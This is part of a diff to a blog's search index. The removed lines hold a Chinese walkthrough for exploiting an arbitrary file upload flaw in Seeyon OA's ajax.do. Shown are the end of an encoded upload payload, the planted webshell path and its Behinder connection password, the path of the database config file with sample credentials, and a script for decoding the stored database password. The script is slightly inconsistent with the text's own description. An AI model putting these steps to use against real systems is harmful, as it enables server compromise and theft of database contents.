%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>
-
-<p>如果漏洞利用成功，回显如下界面</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214707896.png"></p>
-<p>利用失败的话回显如下，或者页面空白，警告等</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214945750.png"></p>
-<p><strong>利用成功后用冰蝎连接</strong> <a href="https://github.com/rebeyond/Behinder/releases">工具链接</a></p>
-<p>webshell路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/SeeyonUpdate1.jspx</span><br></pre></td></tr></table></figure>
-
-<p>连接密码：rebeyond</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412215119512.png"></p>
-<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>连接上马后即可命令执行，同样我们可以进行数据库连接从而实现敏感信息泄露</p>
-<p>当然前提是知道连接数据库的密码 <a href="https://www.cmdhack.com/archives/212.html">参考文章</a></p>
-<p>致远OA数据库配置文件路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/Seeyon/A8/base/conf/datasourceCtp.properties</span><br></pre></td></tr></table></figure>
-
-<p>访问可以找到密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.backup.path=</span><br><span class="line">db.hibernateDialect=org.hibernate.dialect.SQLServerDialect</span><br><span class="line">ctpDataSource.username=sa</span><br><span class="line">workflow.dialect=SQLServer</span><br><span class="line">ctpDataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver</span><br><span class="line">ctpDataSource.password=/1.0/UWJ0dHgxc2U=</span><br><span class="line">ctpDataSource.url=jdbc:sqlserver://127.0.0.1:1433;DatabaseName=seeyou2;maxStatements=0;SelectMethod=cursor</span><br><span class="line">mysql.path=</span><br><span class="line">ctpDataSource.maxCount=2000</span><br></pre></td></tr></table></figure>
-
-<p>不过这里的密码是经过加密的，<code>1.0</code>表示左偏移一位，对应解密成明文</p>
-<p>解密脚本如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a=&quot;&quot;</span><br><span class="line">password = &quot;Ab123456&quot;</span><br><span class="line">for i in password:</span><br><span class="line">    a+= chr(ord(i) -1 )</span><br><span class="line"></span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
-
-<p>得到密码后即可连接数据库造成敏感信息泄露</p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
   </entry>
 </search>
